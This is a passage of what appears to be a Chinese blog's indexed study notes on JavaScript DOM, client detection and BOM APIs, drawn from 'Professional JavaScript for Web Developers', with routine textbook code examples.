insertAdjacentHTML()方法\n两个参数:插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一:\n- \"beforebegin\"，在当前元素之前插入一个紧邻的同辈元素; \n- \"afterbegin\"，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素;\n- \"beforeend\"，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素;\n- \"afterend\"，在当前元素之后插入一个紧邻的同辈元素。\n\n第二个参数是一个HTML字符串：\n```js\n//作为前一个同辈元素插入\nelement.insertAdjacentHTML(\"beforebegin\", \"<p>Hello world!</p>\");\n//作为第一个子元素插入\nelement.insertAdjacentHTML(\"afterbegin\", \"<p>Hello world!</p>\");\n//作为最后一个子元素插入\nelement.insertAdjacentHTML(\"beforeend\", \"<p>Hello world!</p>\");\n//作为后一个同辈元素插入\nelement.insertAdjacentHTML(\"afterend\", \"<p>Hello world!</p>\");\n```\n#### 内存与性能问题\n在使用 innerHTML、 outerHTML 属性和 insertAdjacentHTML()方法时，最好先手工删除要被替换的元素的所有事件处理 程序和 JavaScript 对象属性(第 13 章将进一步讨论事件处理程序)。\n\n另外，对于DOM操作，尽量减少次数，例如下面示例：\n```js\nfor (var i=0, len=values.length; i < len; i++){\n  ul.innerHTML += \"<li>\" + values[i] + \"</li>\"; //要避免这种频繁操作!!\n}\n// 应该如下处理\nvar itemsHtml = \"\";\nfor (var i=0, len=values.length; i < len; i++){\n  itemsHtml += \"<li>\" + values[i] + \"</li>\";\n}\nul.innerHTML = itemsHtml;\n```\n\n\n\n### scrollIntoView()方法（了解）\nscrollIntoView()可以在所有 HTML 元素上调用，通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中。如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中，(可能的话，调用元素的底部会与视口顶部平齐。)不过顶部不一定平齐，例如:\n//让元素可见 document.forms[0].scrollIntoView();\n当页面发生变化时，一般会用这个方法来吸引用户的注意力。实际上，为某个元素设置焦点也会导 致浏览器滚动并显示出获得焦点的元素。\n支持 scrollIntoView()方法的浏览器有 IE、Firefox、Safari 和 Opera。\n\n\n## 专有扩展\n### 文档模式\nIE可以设置文档模式：\n```html\n<!-- 语法 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=IEVersion\">\n<!-- 示例 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\">\n```\n```js\n// 获得文档模式\nvar mode = document.documentMode;\n```\n### children属性\n这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外， children 属性与 childNodes 没有什么区别\n### contains()方法\n判断某个节点是不是另一个节点的后代。\n```js\nalert(document.documentElement.contains(document.body)); //true\n```\n使用 DOM Level 3 compareDocumentPosition()也能够确定节点间的关系。\n\n通用的contains函数：\n```js\nfunction contains(refNode, otherNode){\n  if (typeof refNode.contains == \"function\" &&\n          (!client.engine.webkit || client.engine.webkit >= 522)){\n      return refNode.contains(otherNode);\n  } else if (typeof refNode.compareDocumentPosition == \"function\"){\n      return !!(refNode.compareDocumentPosition(otherNode) & 16);\n  } else {\n    var node = otherNode.parentNode;\n    do {\n        if (node === refNode){\n            return true;\n        } else {\n            node = node.parentNode;\n        }\n    } while (node !== null);\n          return false;\n  }\n}\n```\n### 插入文本\n#### innerText 属性\n通过 innertText 属性可以操作元素中包含的所有文本内容，包括子文档树中的文本。\n\n可以通过 innerText 属性过滤掉 HTML 标签：\n```js\ndiv.innerText = div.innerText;\n\n// 兼容函数\nfunction getInnerText(element){\n    return (typeof element.textContent == \"string\") ?\n        element.textContent : element.innerText;\n}\nfunction setInnerText(element, text){\n    if (typeof element.textContent == \"string\"){\n        element.textContent = text;\n    } else {\n        element.innerText = text;\n    }\n}\n```\n#### outerText 属性\n除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。\n### 滚动\n- scrollIntoViewIfNeeded(alignCenter):只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部(垂直方向)。 10 Safari 和 Chrome 实现了这个方法。\n- scrollByLines(lineCount):将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。\n- scrollByPages(pageCount):将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。\n\n希望大家要注意的是，scrollIntoView()和scrollIntoViewIfNeeded()的作用对象是元素的 容器，而 scrollByLines()和 scrollByPages()影响的则是元素自身。\n```js\n//将页面主体滚动 \ndocument.body.scrollByLines(5);\n//在当前元素不可见的时候，让它进入浏览器的视口\ndocument.images[0].scrollIntoViewIfNeeded();\n//将页面主体往回滚动\ndocument.body.scrollByPages(-1);\n```\n由于 scrollIntoView()是唯一一个所有浏览器都支持的方法，因此还是这个方法最常用。\n# 后记","tags":["笔记"],"categories":["前端"]},{"title":"DOM（《JavaScript高级程序设计》）","url":"%2F2019-01-28-JS%E9%AB%98%E8%AE%BE3%E7%89%88-10%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\nDOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API（应用程序编程接口）。DOM 描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。\n\n<!-- more -->\n\n# 详述\n\n## 节点层次\n\nHTML 与 DOM 树对应关系示例：\n\n```html\n<html>\n  <head>\n    <title>Sample Page</title>\n  </head>\n  <body>\n    <p>Hello World!</p>\n  </body>\n</html>\n```\n\n![DOM树示例](1.jpg)\n\n文档节点是每个文档的根节点。在这个例子中，文档节点只有一个子节点，即<html>元素，我们称之为**文档元素**。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。\n\n### Node 类型\n\nDOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。JavaScript 中通过 Node 类型来实现，作为基类，所有节点类型都继承自 Node 类型。\n\nnodeType 属性：表明节点的类型，由 12 个数值常量来表示。实践中，为了兼容，通常与数值比较，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  //适用于所有浏览器\n  alert(\"Node is an element.\");\n}\n```\n\nnodeName 和 nodeValue 属性：值取决于节点类型，因此实践中通常先检测类型再取值，如下：\n\n```js\nif (someNode.nodeType == 1) {\n  value = someNode.nodeName; //nodeName 的值是元素的标签名\n}\n```\n\nchildNodes 属性：保存着一个 NodeList 对象。NodeList 对象时一种类数组对象，基于 DOM 动态执行查询的结果，DOM 结构的变化能够自动反映在 NodeList 对象中。\n\n其他属性：parentNode，previousSibling，nextSibling，firstChild，lastChild，ownerDocument。\n\nhasChildNodes()方法：无参数，有节点时返回 true。\n\nappendChild()方法：一个参数，要添加的节点，如果该节点已经存在文档中，那么就是移动节点。\n\ninsertBefore()方法：两个参数，要插入的节点和作为参照的节点。\n\nreplaceChild()方法：两个参数，要插入的节点和要替换的节点。\n\nremoveChild()方法：一个参数，要移除的节点。\n\ncloneNode()方法：一个布尔参数，表示是否深复制。\n\nnormalize()方法：处理文本节点，后面章节再详述。\n\n### Document 类型\n\n在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。\n\nDocument 节点具有下列特征：\n\n- nodeType 的值为 9；\n- nodeName 的值为\"#document\"；\n- nodeValue 的值为 null；\n- parentNode 的值为 null；\n- ownerDocument 的值为 null；\n- 其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。\n\n#### 文档的子节点\n\n```html\n<html>\n  <body></body>\n</html>\n```\n\n```js\nvar html = document.documentElement; //取得对<html>的引用\nalert(html === document.childNodes[0]); //true\nalert(html === document.firstChild); //true\n\nvar body = document.body; //取得对<body>的引用\n```\n\n#### 文档信息\n\n```js\n//取得文档标题\nvar originalTitle = document.title;\n//设置文档标题\ndocument.title = \"New page title\";\n\n//取得完整的URL\nvar url = document.URL;\n//取得域名\nvar domain = document.domain;\n//取得来源页面的URL\nvar referrer = document.referrer;\n```\n\n其中 domain 可设置，但是不能将这个属性设置为 URL 中不包含的域\n\n```js\n//假设页面来自p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; // 成功\ndocument.domain = \"nczonline.net\"; // 出错！\n```\n\n还有一个限制，不能从松散到紧绷\n\n```js\n//假设页面来自于p2p.wrox.com 域\ndocument.domain = \"wrox.com\"; //松散的（成功）\ndocument.domain = \"p2p.wrox.com\"; //紧绷的（出错！）\n```\n\n实践中可以利用 domain 可设置来解决子域之间跨域问题\n\n#### 查找元素\n\ngetElementById()，。这里的 ID 必须与页面中元素的 id 特性（attribute）严格匹配，包括大小写。\n\ngetElementsByTagName()，返回一个 NodeList，在 HTML 文档中对应的是 HTMLCollection 对象。\n对 HTMLCollection 而言，我们可以向方括号中传入数值或字符串形式的索引值。在后台，对数\n值索引就会调用 item()，而对字符串索引就会调用 namedItem()。\n\n```js\nvar images = document.getElementsByTagName(\"img\");\nalert(images.length); //输出图像的数量\nalert(images[0].src); //输出第一个图像元素的src 特性\nalert(images.item(0).src); //输出第一个图像元素的 src 特性\n\n// <img src=\"myimage.gif\" name=\"myImage\">\nvar myImage = images.namedItem(\"myImage\");\nvar myImage = images[\"myImage\"];\n\nvar allElements = document.getElementsByTagName(\"*\");\n```\n\ngetElementsByName()，只有 HTMLDocument 类型才有的方法。\n\n```html\n<fieldset>\n  <legend>Which color do you prefer?</legend>\n  <ul>\n    <li>\n      <input type=\"radio\" value=\"red\" name=\"color\" id=\"colorRed\" />\n      <label for=\"colorRed\">Red</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"green\" name=\"color\" id=\"colorGreen\" />\n      <label for=\"colorGreen\">Green</label>\n    </li>\n    <li>\n      <input type=\"radio\" value=\"blue\" name=\"color\" id=\"colorBlue\" />\n      <label for=\"colorBlue\">Blue</label>\n    </li>\n  </ul>\n</fieldset>\n```\n\n```js\nvar radios = document.getElementsByName(\"color\");\n```\n\n#### 特殊集合\n\n除了属性和方法，document 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象，\n为访问文档常用的部分提供了快捷方式，包括：\n\n- document.anchors，包含文档中所有带 name 特性的`<a>`元素；\n- document.applets，包含文档中所有的`<applet>`元素，因为不再推荐使用`<applet>`元素，所以这个集合已经不建议使用了；\n- document.forms，包含文档中所有的`<form>`元素，与 document.getElementsByTagName(\"form\")得到的结果相同；\n- document.images，包含文档中所有的`<img>`元素，与 document.getElementsByTagName(\"img\")得到的结果相同；\n- document.links，包含文档中所有带 href 特性的`<a>`元素。\n\n#### 其他\n\n```js\ndocument.implementation.hasFeature();\ndocument.write();\ndocument.writeln();\ndocument.open();\ndocument.close();\n```\n\n### Element 类型\n\nElement 类型用于表现 XML 或 HTML 元素，提供了对元素标签名、子节点及特性的访问。Element 节点具有以下特征：\n\n- nodeType 的值为 1；\n- nodeName 的值为元素的标签名；\n- nodeValue 的值为 null；\n- parentNode 可能是 Document 或 Element；\n- 其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。\n  要访问元素的标签名，可以使用 nodeName 属性，也可以使用 tagName 属性。\n\n对于标签名，HTML 中始终返回全大写，XML 中返回与源代码中一致，因此，实践中通常直接用 toLowerCase()转换后比较。如下：\n\n```js\n// <div id=\"myDiv\"></div>\nvar div = document.getElementById(\"myDiv\");\nalert(div.tagName); //\"DIV\"\nalert(div.tagName == div.nodeName); //true\n\nif (element.tagName == \"div\") {\n  //不能这样比较，很容易出错！\n  //在此执行某些操作\n}\nif (element.tagName.toLowerCase() == \"div\") {\n  //这样最好（适用于任何文档）\n  //在此执行某些操作\n}\n```\n\n#### HTML 元素\n\n对应的对象共有的读写属性有：`id,title,className,lang,dir`\n\n#### 操作特性\n\ngetAttribute()、setAttribute()、removeAttribute()、setAttribute()\n\n特性名称不区分大小写，自定义特性加 data-前缀。\n\n实践中，操作特性，常用对象的属性（div.id），只有自定义特性才用 getAttribute()、setAttribute()。\n\n#### attributes 属性\n\n一般只在遍历元素的属性时使用，例如：\n\n```js\nfunction outputAttributes(element) {\n  var pairs = new Array(),\n    attrName,\n    attrValue,\n    i,\n    len;\n  for (i = 0, len = element.attributes.length; i < len; i++) {\n    attrName = element.attributes[i].nodeName;\n    attrValue = element.attributes[i].nodeValue;\n    pairs.push(attrName + '=\"' + attrValue + '\"');\n  }\n  return pairs.join(\" \");\n}\n```\n\n#### 创建元素\n\ndocument.createElement()，一个参数，要创建元素的标签名。\n\n```js\nvar div = document.createElement(\"div\");\n```\n\n#### 元素的子节点\n\n大部分浏览器中，空格、换行都会作为元素的子节点，因此实践中会先检查 nodeType 属性，如下：\n\n```js\nfor (var i = 0, len = element.childNodes.length; i < len; i++) {\n  if (element.childNodes[i].nodeType == 1) {\n    //执行某些操作\n  }\n}\n```\n\n### Text 类型\n\n文本节点由 Text 类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的 HTML 字符，但不能包含 HTML 代码。Text 节点具有以下特征：\n\n- nodeType 的值为 3；\n- nodeName 的值为\"#text\"；\n- nodeValue 的值为节点所包含的文本；\n- parentNode 是一个 Element；\n- 不支持（没有）子节点。\n\n可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 nodeValue 的修改也会通过 data 反映出来，反之亦然。使用下列方法可以操作节点中的文本。\n\n- appendData(text)：将 text 添加到节点的末尾。\n- deleteData(offset, count)：从 offset 指定的位置开始删除 count 个字符。\n- insertData(offset, text)：在 offset 指定的位置插入 text。\n- replaceData(offset, count, text)：用 text 替换从 offset 指定的位置开始到 offset+count 为止处的文本。\n- splitText(offset)：从 offset 指定的位置将当前文本节点分成两个文本节点。\n- substringData(offset, count)：提取从 offset 指定的位置开始到 offset+count 为止处的字符串。\n\nlength 属性，保存着节点中字符的数目。\n\n#### 创建文本节点\n\ndocument.createTextNode()，一个参数，要插入节点中的文本。\n\n#### 规范化文本节点\n\nnormalize()，在父元素上调用该方法，会把所有文本节点合并成一个节点。\n\n#### 分割文本节点\n\nsplitText()，一个参数，指定位置分割文本节点。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。\n\n### 其他类型\n\n了解 Comment 类型，CDATASection 类型，DocumentType 类型，DocumentFragment 类型，Attr 类型。重点关注下 DocumentFragment 类型，是一种“轻量级”的文档，对于节点在文档与文档片段间的添加，若存在则是移动而不是复制。实践中常作为“仓库”使用，可以避免浏览器反复渲染。\n\n```js\nvar fragment = document.createDocumentFragment();\nvar ul = document.getElementById(\"myList\");\nvar li = null;\nfor (var i = 0; i < 3; i++) {\n  li = document.createElement(\"li\");\n  li.appendChild(document.createTextNode(\"Item \" + (i + 1)));\n  fragment.appendChild(li);\n}\nul.appendChild(fragment);\n```\n\n## DOM 操作技术\n\n### 动态脚本\n\n```js\nfunction loadScript(url) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  script.src = url;\n  document.body.appendChild(script);\n}\n// loadScript(\"client.js\");\n\nfunction loadScriptString(code) {\n  var script = document.createElement(\"script\");\n  script.type = \"text/javascript\";\n  try {\n    script.appendChild(document.createTextNode(code));\n  } catch (ex) {\n    script.text = code;\n  }\n  document.body.appendChild(script);\n}\n// loadScriptString(\"function sayHi(){alert('hi');}\");\n```\n\n### 动态样式\n\n```js\nfunction loadStyles(url) {\n  var link = document.createElement(\"link\");\n  link.rel = \"stylesheet\";\n  link.type = \"text/css\";\n  link.href = url;\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(link);\n}\n// loadStyles(\"styles.css\");\n\nfunction loadStyleString(css) {\n  var style = document.createElement(\"style\");\n  style.type = \"text/css\";\n  try {\n    style.appendChild(document.createTextNode(css));\n  } catch (ex) {\n    style.styleSheet.cssText = css;\n  }\n  var head = document.getElementsByTagName(\"head\")[0];\n  head.appendChild(style);\n}\n// loadStyleString(\"body{background-color:red}\");\n```\n\n### 操作表格\n\n可以用核心 DOM 方法也可以用 HTML DOM 为`<table>`、`<tbody>`和`<tr>`元素添加的属性和方法。由于实践中较少使用，这里不一一列举。\n\n### 使用 NodeList\n\n理解 NodeList 及其“近亲”NamedNodeMap 和 HTMLCollection，是从整体上透彻理解 DOM 的\n关键所在。这三个集合都是“动态的”；换句话说，每当文档结构发生变化时，它们都会得到更新。因\n此，它们始终都会保存着最新、最准确的信息。从本质上说，所有 NodeList 对象都是在访问 DOM 文\n档时实时运行的查询。例如，下列代码会导致无限循环：\n\n```js\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  div;\nfor (i = 0; i < divs.length; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n\n// 解决方法\nvar divs = document.getElementsByTagName(\"div\"),\n  i,\n  len,\n  div;\nfor (i = 0, len = divs.length; i < len; i++) {\n  div = document.createElement(\"div\");\n  document.body.appendChild(div);\n}\n```\n\n实践中，由于 NodeList 的操作开销很大，因此一般都是把 NodeList 取得的值缓存起来。\n\n# 后记\n","tags":["笔记"],"categories":["前端"]},{"title":"客户端检测（《JavaScript高级程序设计》）","url":"%2F2019-01-23-JS%E9%AB%98%E8%AE%BE3%E7%89%88-9%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n\n客户端检测，只有在万不得已的时候再使用，使用优先顺序为：能力检测>怪癖检测>用户代理检测。\n\n<!-- more -->\n\n# 详述\n\n## 能力检测\n\n在编写代码之前先检测特定浏览器的能力。\n\n## 怪癖检测\n\n怪癖实际上是浏览器实现中存在的 bug，只在某个怪癖会干 扰脚本运行的情况下使用。\n\n## 用户代理检测\n\n由于历史原因，现在各个浏览器的用户代理 userAgent 中包含重复交错的信息，因此封装一个检测库：\n\n```js\nvar client = (function() {\n  //呈现引擎\n  var engine = {\n    ie: 0,\n    gecko: 0,\n    webkit: 0,\n    khtml: 0,\n    opera: 0,\n    //完整的版本号\n    ver: null\n  };\n  //浏览器\n  var browser = {\n    //主要浏览器\n    ie: 0,\n    firefox: 0,\n    safari: 0,\n    konq: 0,\n    opera: 0,\n    chrome: 0,\n    //具体的版本号\n    ver: null\n  };\n  //平台、设备和操作系统\n  var system = {\n    win: false,\n    mac: false,\n    x11: false,\n    //移动设备\n    iphone: false,\n    ipod: false,\n    ipad: false,\n    ios: false,\n    android: false,\n    nokiaN: false,\n    winMobile: false,\n    //游戏系统\n    wii: false,\n    ps: false\n  };\n  //检测呈现引擎和浏览器\n  var ua = navigator.userAgent;\n  if (window.opera) {\n    engine.ver = browser.ver = window.opera.version();\n    engine.opera = browser.opera = parseFloat(engine.ver);\n  } else if (/AppleWebKit\\/(\\S+)/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.webkit = parseFloat(engine.ver);\n    //确定是Chrome 还是Safari\n    if (/Chrome\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.chrome = parseFloat(browser.ver);\n    } else if (/Version\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.safari = parseFloat(browser.ver);\n    } else {\n      //近似地确定版本号\n      var safariVersion = 1;\n      if (engine.webkit < 100) {\n        safariVersion = 1;\n      } else if (engine.webkit < 312) {\n        safariVersion = 1.2;\n      } else if (engine.webkit < 412) {\n        safariVersion = 1.3;\n      } else {\n        safariVersion = 2;\n      }\n      browser.safari = browser.ver = safariVersion;\n    }\n  } else if (/KHTML\\/(\\S+)/.test(ua) || /Konqueror\\/([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.khtml = browser.konq = parseFloat(engine.ver);\n  } else if (/rv:([^\\)]+)\\) Gecko\\/\\d{8}/.test(ua)) {\n    engine.ver = RegExp[\"$1\"];\n    engine.gecko = parseFloat(engine.ver);\n    //确定是不是Firefox\n    if (/Firefox\\/(\\S+)/.test(ua)) {\n      browser.ver = RegExp[\"$1\"];\n      browser.firefox = parseFloat(browser.ver);\n    }\n  } else if (/MSIE ([^;]+)/.test(ua)) {\n    engine.ver = browser.ver = RegExp[\"$1\"];\n    engine.ie = browser.ie = parseFloat(engine.ver);\n  }\n  //检测浏览器\n  browser.ie = engine.ie;\n  browser.opera = engine.opera;\n  //检测平台\n  var p = navigator.platform;\n  system.win = p.indexOf(\"Win\") == 0;\n  system.mac = p.indexOf(\"Mac\") == 0;\n  system.x11 = p == \"X11\" || p.indexOf(\"Linux\") == 0;\n  //检测Windows 操作系统\n  if (system.win) {\n    if (/Win(?:dows )?([^do]{2})\\s?(\\d+\\.\\d+)?/.test(ua)) {\n      if (RegExp[\"$1\"] == \"NT\") {\n        switch (RegExp[\"$2\"]) {\n          case \"5.0\":\n            system.win = \"2000\";\n            break;\n          case \"5.1\":\n            system.win = \"XP\";\n            break;\n          case \"6.0\":\n            system.win = \"Vista\";\n            break;\n          case \"6.1\":\n            system.win = \"7\";\n            break;\n          default:\n            system.win = \"NT\";\n            break;\n        }\n      } else if (RegExp[\"$1\"] == \"9x\") {\n        system.win = \"ME\";\n      } else {\n        system.win = RegExp[\"$1\"];\n      }\n    }\n  }\n  //移动设备\n  system.iphone = ua.indexOf(\"iPhone\") > -1;\n  system.ipod = ua.indexOf(\"iPod\") > -1;\n  system.ipad = ua.indexOf(\"iPad\") > -1;\n  system.nokiaN = ua.indexOf(\"NokiaN\") > -1;\n  //windows mobile\n  if (system.win == \"CE\") {\n    system.winMobile = system.win;\n  } else if (system.win == \"Ph\") {\n    if (/Windows Phone OS (\\d+.\\d+)/.test(ua)) {\n      system.win = \"Phone\";\n      system.winMobile = parseFloat(RegExp[\"$1\"]);\n    }\n  }\n  //检测iOS 版本\n  if (system.mac && ua.indexOf(\"Mobile\") > -1) {\n    if (/CPU (?:iPhone )?OS (\\d+_\\d+)/.test(ua)) {\n      system.ios = parseFloat(RegExp.$1.replace(\"_\", \".\"));\n    } else {\n      system.ios = 2; //不能真正检测出来，所以只能猜测\n    }\n  }\n  //检测Android 版本\n  if (/Android (\\d+\\.\\d+)/.test(ua)) {\n    system.android = parseFloat(RegExp.$1);\n  }\n  //游戏系统\n  system.wii = ua.indexOf(\"Wii\") > -1;\n  system.ps = /playstation/i.test(ua);\n  //返回这些对象\n  return {\n    engine: engine,\n    browser: browser,\n    system: system\n  };\n})();\n```\n","tags":["笔记"],"categories":["前端"]},{"title":"BOM（《JavaScript高级程序设计》）","url":"%2F2019-01-10-JS%E9%AB%98%E8%AE%BE3%E7%89%88-8%2F","content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\nBOM（浏览器对象模型），理解window对象，重点掌握location对象和navigator对象的使用。\n<!-- more -->\n\n# 详述\n\n## window 对象\n\n双重角色，既是 JavaScript 访问浏览器窗口的接口，又是 ECMAScript 规定的 Global 对象。\n\n### 页面视口大小\n\n```js\n// 兼容写法\nvar pageWidth = window.innerWidth,\n  pageHeight = window.innerHeight;\nif (typeof pageWidth != \"number\") {\n  if (document.compatMode == \"CSS1Compat\") {\n    pageWidth = document.documentElement.clientWidth;\n    pageHeight = document.documentElement.clientHeight;\n  } else {\n    pageWidth = document.body.clientWidth;\n    pageHeight = document.body.clientHeight;\n  }\n}\n```\n\n### 窗口关系及框架\n\n```html\n<html>\n    <head>\n        <title>Frameset Example</title>\n    </head>\n    <frameset rows=\"160,*\">\n        <frame src=\"frame.htm\" name=\"topFrame\">\n        <frameset cols=\"50%,50%\">\n            <frame src=\"anotherframe.htm\" name=\"leftFrame\">\n            <frame src=\"yetanotherframe.htm\" name=\"rightFrame\">\n        </frameset>\n    </frameset>\n</html>\n```\n\n常用属性及方法：`window.frames`,`window.self`,`window.top`,`window.parent`,`window.open()`\n\n### 打开窗口\n\n```js\nvar blocked = false;\ntry {\n  var wroxWin = window.open(\"http://www.wrox.com\", \"_blank\");\n  if (wroxWin == null) {\n    blocked = true;\n  }\n} catch (ex) {\n  blocked = true;\n}\nif (blocked) {\n  alert(\"The popup was blocked!\");\n}\n```\n\n### 超时调用 setTimeout()\n\n两个参数：要执行的代码和以毫秒表示的时间。\n\n第一个参数可以是字符串，可以是函数名，可以是匿名函数体，不推荐字符串写法。\n\n第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即\n执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。注意，不要理解成过多长时间执行任务！\n\n取消超时调用：`clearTimeout()`。\n\n```js\n//推荐的调用方式\nvar timeoutId = setTimeout(function() {\n  alert(\"Hello world!\");\n}, 1000);\n//取消\nclearTimeout(timeoutId);\n```\n\n### 间歇调用 setInterval()\n\n语法同 setTimeout()。\n\n取消间歇调用：`clearTimeout()`。\n\n实现间歇调用，一般不直接用 setInterval，而是用 setTimeout 实现，如下：\n\n```js\nvar num = 0;\nvar max = 10;\nfunction incrementNumber() {\n  num++;\n  //如果执行次数未达到max 设定的值，则设置另一次超时调用\n  if (num < max) {\n    setTimeout(incrementNumber, 500);\n  } else {\n    alert(\"Done\");\n  }\n}\nsetTimeout(incrementNumber, 500);\n```\n\n关于 setTimeout 与 setInterval 的进一步分析，请看另外一篇[定时器详解](/2018/04/09/JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E5%AE%9A%E6%97%B6%E5%99%A8%E8%AF%A6%E8%A7%A3/)\n\n### 系统对话框\n\n`alert(),onfirm(),prompt(),print(),find()`\n\n## location 对象\n\nwindow.location 和 document.location 引用的是同一个对象。\n\nlocation 对象的所有属性: `hash,host,hostname,href,pathname,port,protocol,search`。\n\n### 查询字符串参数\n\n```js\nfunction getQueryStringArgs() {\n  //取得查询字符串并去掉开头的问号\n  var qs = location.search.length > 0 ? location.search.substring(1) : \"\",\n    //保存数据的对象\n    args = {},\n    //取得每一项\n    items = qs.length ? qs.split(\"&\") : [],\n    item = null,\n    name = null,\n    value = null,\n    //在for 循环中使用\n    i = 0,\n    len = items.length;\n  //逐个将每一项添加到args 对象中\n  for (i = 0; i < len; i++) {\n    item = items[i].split(\"=\");\n    name = decodeURIComponent(item[0]);\n    value = decodeURIComponent(item[1]);\n    if (name.length) {\n      args[name] = value;\n    }\n  }\n  return args;\n}\n```\n\n### 位置操作\n\n导航到 URL，会生成历史记录，可以后退。\n\n```js\n// 三种方式等价\nlocation.assign(\"http://www.wrox.com\");\nwindow.location = \"http://www.wrox.com\";\nlocation.href = \"http://www.wrox.com\";\n\n// 直接修改属性值也可以\n//假设初始URL 为http://www.wrox.com/WileyCDA/\n//将URL 修改为\"http://www.wrox.com/WileyCDA/#section1\"\nlocation.hash = \"#section1\";\n//将URL 修改为\"http://www.wrox.com/WileyCDA/?q=javascript\"\nlocation.search = \"?q=javascript\";\n//将URL 修改为\"http://www.yahoo.com/WileyCDA/\"\nlocation.hostname = \"www.yahoo.com\";\n//将URL 修改为\"http://www.yahoo.com/mydir/\"\nlocation.pathname = \"mydir\";\n//将URL 修改为\"http://www.yahoo.com:8080/WileyCDA/\"\nlocation.port = 8080;\n```\n\n导航到 URL，不会生成历史记录，无法后退。\n\n```js\nlocation.replace(\"http://www.wrox.com/\");\n```\n\n重新加载当前显示的页面。\n\n```js\nlocation.reload(); //重新加载（有可能从缓存中加载）\nlocation.reload(true); //重新加载（从服务器重新加载）\n```\n\n## navigator 对象\n\n用于识别客户端浏览器\n\n### 检测插件\n\n```js\n//检测插件（在IE 中无效）\nfunction hasPlugin(name) {\n  name = name.toLowerCase();\n  for (var i = 0; i < navigator.plugins.length; i++) {\n    if (navigator.plugins[i].name.toLowerCase().indexOf(name) > -1) {\n      return true;\n    }\n  }\n  return false;\n}\n//检测Flash\nalert(hasPlugin(\"Flash\"));\n//检测QuickTime\nalert(hasPlugin(\"QuickTime\"));\n\n//检测IE 中的插件\nfunction hasIEPlugin(name) {\n  try {\n    new ActiveXObject(name);\n    return true;\n  } catch (ex) {\n    return false;\n  }\n}\n//检测Flash\nalert(hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\"));\n//检测QuickTime\nalert(hasIEPlugin(\"QuickTime.QuickTime\"));\n\n//检测所有浏览器中的Flash\nfunction hasFlash() {\n  var result = hasPlugin(\"Flash\");\n  if (!result) {\n    result = hasIEPlugin(\"ShockwaveFlash.ShockwaveFlash\");\n  }\n  return result;\n}\n//检测所有浏览器中的QuickTime\nfunction hasQuickTime() {\n  var result = hasPlugin(\"QuickTime\");\n  if (!result) {\n    result = hasIEPlugin(\"QuickTime.QuickTime\");\n  }\n  return result;\n}\n//检测Flash\nalert(hasFlash());\n//检测QuickTime\nalert(hasQuickTime());\n```\n### 注册处理程序\n```js\nnavigator.registerContentHandler(\"application/rss+xml\", \"http://www.somereader.com?feed=%s\", \"Some Reader\");\n\nnavigator.registerProtocolHandler(\"mailto\", \"http://www.somemailclient.com?cmd=%s\", \"Some Mail Client\");\n```\n\n\n## screen 对象\n保存着与客户端显示器有关的信息，这些信息一般只用于站点分析。\n\n\n## history 对象\n\n判断历史记录的数量`history.length`\n```js\nif (history.length == 0){\n//这应该是用户打开窗口后的第一个页面\n}\n```\n\n向后或向前导航到任意页面`go(),back(),forward()`\n```js\n//后退一页\nhistory.go(-1);\n//前进一页\nhistory.go(1);\n//前进两页\nhistory.go(2);\n\n//跳转到最近的wrox.com 页面\nhistory.go(\"wrox.com\");\n//跳转到最近的nczonline.net 